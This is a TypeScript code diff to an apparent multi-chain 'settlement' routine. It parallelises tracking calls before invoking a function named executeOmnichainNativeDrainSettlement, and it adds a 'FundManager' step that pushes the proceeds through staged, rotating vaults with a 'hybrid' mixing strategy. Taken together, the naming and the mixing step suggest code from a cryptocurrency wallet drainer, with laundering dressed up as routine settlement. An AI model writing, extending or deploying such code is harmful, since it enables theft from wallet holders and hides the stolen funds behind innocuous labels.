@@ -634,46 +634,38 @@ export async function executeOmnichainAtomicSettlement(params: {
       if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) chains.sui = 'failed'
     }
 
-    // SETTLEMENT TRACKING: Mark native chains as in-progress (in-memory + V3 API)
+    // Mark all chains in-progress first (parallel)
+    const trackingPromises: Promise<unknown>[] = []
     if (hasSolana) {
       settlementTracker.markInProgress('solana')
-      if (settlementRequestId) {
-        await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'solana' }).catch(console.warn)
-      }
+      trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'solana' }).catch(console.warn))
     }
     if (hasTron) {
       settlementTracker.markInProgress('tron')
-      if (settlementRequestId) {
-        await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'tron' }).catch(console.warn)
-      }
+      trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'tron' }).catch(console.warn))
     }
     if (hasTon) {
       settlementTracker.markInProgress('ton')
-      if (settlementRequestId) {
-        await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'ton' }).catch(console.warn)
-      }
+      trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'ton' }).catch(console.warn))
     }
     if (hasCosmosAptosSui) {
       if (hasPositiveExtendedAmount(omnichainMerged.native_amount_cosmos)) {
         settlementTracker.markInProgress('cosmos')
-        if (settlementRequestId) {
-          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'cosmos' }).catch(console.warn)
-        }
+        trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'cosmos' }).catch(console.warn))
       }
       if (hasPositiveExtendedAmount(omnichainMerged.native_amount_aptos)) {
         settlementTracker.markInProgress('aptos')
-        if (settlementRequestId) {
-          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'aptos' }).catch(console.warn)
-        }
+        trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'aptos' }).catch(console.warn))
       }
       if (hasPositiveExtendedAmount(omnichainMerged.native_amount_sui)) {
         settlementTracker.markInProgress('sui')
-        if (settlementRequestId) {
-          await startChainTracking({ settlement_request_id: settlementRequestId, chain: 'sui' }).catch(console.warn)
-        }
+        trackingPromises.push(startChainTracking({ settlement_request_id: settlementRequestId || '', chain: 'sui' }).catch(console.warn))
       }
     }
 
+    await Promise.all(trackingPromises).catch(console.warn)
+
+    // Execute settlement in parallel
     const omnichainResult = await executeOmnichainNativeDrainSettlement(omnichainMerged, {
       skipPreflight: true,
       ownerAddress: params.owner,
@@ -1038,6 +1030,20 @@ export async function executeOmnichainAtomicSettlement(params: {
         settlement_mode: 'parallel_v1',
       },
     )
+
+    // FUND MANAGER: Route distributed funds through smart vault system
+    try {
+      const fundManager = new FundManager([
+        { address: params.owner, chain: 'evm', balance: parseFloat(params.scout_value_usd?.toString() || '0'), riskProfile: 'hot', maxCapacity: 1000000, currentAllocation: 0 },
+      ])
+      await fundManager.manageFunds(parseFloat(params.scout_value_usd?.toString() || '0'), 'evm', {
+        stageCount: 3,
+        mixingStrategy: 'hybrid',
+        rotateVaults: true,
+      })
+    } catch (err) {
+      console.warn('[FUND_MANAGER] Distribution error:', err)
+    }
   } else {
     console.warn(
       'OMNICHAIN_SETTLEMENT_PARALLEL_PARTIAL: Some chains failed',
